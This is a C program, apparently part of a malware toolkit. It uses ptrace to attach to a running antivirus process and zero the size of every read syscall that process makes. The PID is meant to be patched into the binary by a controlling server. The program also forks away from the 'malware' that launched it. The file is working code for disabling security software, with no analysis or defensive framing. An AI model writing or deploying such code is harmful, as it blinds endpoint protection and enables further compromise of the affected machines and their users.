#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

// unusual value to overide with run time pid of the antivirus
const int UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678;

// global variables for the binary patching of this compiled file
// by the server when getting the run time pid of the antivirus
int pid = UNUSUAL_PID_VALUE_FOR_BIN_PATCH;

int main(int argc, char **argv) {
    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }

    // attach to the process
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("attach");
        return 1;
    }
    // wait for the process to stop
    int status;
    waitpid(pid, &status, 0);
    // abort if the process exits
    if(WIFEXITED(status)) { return 1; }

    while(1) {
        // patching the syscall 'read' arguments
        // to return false on each call
        if(ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
            perror("syscall1");
            return 1;
        }        
        waitpid(pid, &status, 0);
        // abort if the process exits
        if(WIFEXITED(status)) { return 1; }

        struct user_regs_struct regs;
        if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
            perror("getregs");
            return 1;
        }

        // check for read syscall
        if(regs.orig_eax == 3)
        {
            // patch size
            regs.edx = 0;
            
            if(ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
                perror("setregs");
                return 1;
            }
        }
 
        if(ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
            perror("syscall2");
            return 1;
        }        
        waitpid(pid, &status, 0);
        // abort if the process exits
        if(WIFEXITED(status)) { return 1; }
    }

    // detach from the process
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("detach");
        return 1;
    }
    
    return 0;
}
